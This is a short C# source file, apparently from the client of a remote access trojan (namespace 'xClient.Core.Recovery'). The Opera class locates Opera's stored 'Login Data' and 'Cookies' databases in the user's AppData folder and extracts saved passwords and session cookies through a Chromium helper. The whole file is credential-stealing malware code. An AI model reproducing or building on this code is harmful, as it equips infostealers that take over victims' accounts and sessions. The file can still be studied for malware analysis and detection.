using System;
using System.Collections.Generic;
using System.IO;
using xClient.Core.Data;
using xClient.Core.Recovery.Utilities;

namespace xClient.Core.Recovery.Browsers;

public class Opera
{
	public static List<RecoveredAccount> GetSavedPasswords()
	{
		try
		{
			return ChromiumBase.Passwords(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software\\Opera Stable\\Login Data"), "Opera");
		}
		catch (Exception)
		{
			return new List<RecoveredAccount>();
		}
	}

	public static List<ChromiumBase.ChromiumCookie> GetSavedCookies()
	{
		try
		{
			return ChromiumBase.Cookies(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software\\Opera Stable\\Cookies"), "Opera");
		}
		catch (Exception)
		{
			return new List<ChromiumBase.ChromiumCookie>();
		}
	}
}
